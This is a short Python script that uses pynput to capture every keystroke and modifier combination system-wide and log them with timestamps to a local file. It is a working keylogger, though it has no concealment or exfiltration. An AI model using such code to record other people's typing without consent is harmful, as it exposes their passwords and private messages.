from pynput.keyboard import Listener, Key
import logging, os

log_file = "your dirs"
os.makedirs(os.path.dirname(log_file), exist_ok=True)
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s") # Log format
current_modifiers = set()
control_map = {chr(i): chr(i + 64) for i in range(1, 27)}


def on_press(key):
    # Caps Lock
    if isinstance(key, Key) and key == Key.caps_lock:
        logging.info("CapsLock")
        return

    # Handle modifier keys - DO NOT log immediately to avoid dupe log
    if isinstance(key, Key) and key in (Key.ctrl_l, Key.ctrl_r, Key.shift, Key.shift_l, Key.shift_r, Key.alt_l,
                                        Key.alt_r):
        modifier_name = "Ctrl" if "ctrl" in key.name else key.name.capitalize()
        current_modifiers.add(modifier_name)
        # Do NOT write log modifier keys here anymore
    else:
        # Process other keys as usual
        try:
            ch = key.char
            if ch in control_map and any("Ctrl" in k for k in current_modifiers):
                combo = "+".join(current_modifiers) + "+{}".format(control_map[ch])
            else:
                combo = "+".join(current_modifiers | {ch.upper()})
        except AttributeError:
            combo = "+".join(current_modifiers | {str(key)})

        logging.info(f"{combo}")


def on_release(key):
    if isinstance(key, Key):
        name = "Ctrl" if "ctrl" in key.name else key.name.capitalize()
        current_modifiers.discard(name)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()